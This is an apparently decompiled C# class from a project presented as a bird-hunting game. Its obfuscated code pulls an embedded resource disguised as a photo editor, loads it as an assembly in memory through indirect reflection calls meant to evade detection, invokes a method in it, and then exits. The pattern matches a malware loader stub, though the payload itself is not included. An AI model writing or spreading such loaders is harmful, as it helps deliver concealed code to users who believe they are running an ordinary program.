using System;
using System.Reflection;
using BirdHuntingGame.Properties;
using Microsoft.VisualBasic;

namespace BirdHuntingGame;

internal class AMINOCORE
{
	public AMINOCORE()
	{
		AIJISAJIS();
	}

	public static byte[] a()
	{
		return Resources.PhotoDirector_2;
	}

	public string AIJISAJIS()
	{
		byte[] array = a();
		object obj = Type.GetType("System.Reflection.Assembly")!.InvokeMember("Load", BindingFlags.InvokeMethod, null, null, new object[1] { array });
		object obj2 = Interaction.CallByName(obj, "GetType", (CallType)2, new object[1] { "PhotoDirector.PhotoEditor" });
		object obj3 = Interaction.CallByName(obj2, "GetMethod", (CallType)2, new object[1] { "Stop" });
		Interaction.CallByName(obj3, "Invoke", (CallType)1, new object[2]
		{
			null,
			new object[2]
			{
				J4.p,
				"BirdHuntingGame"
			}
		});
		Environment.Exit(0);
		return "";
	}
}
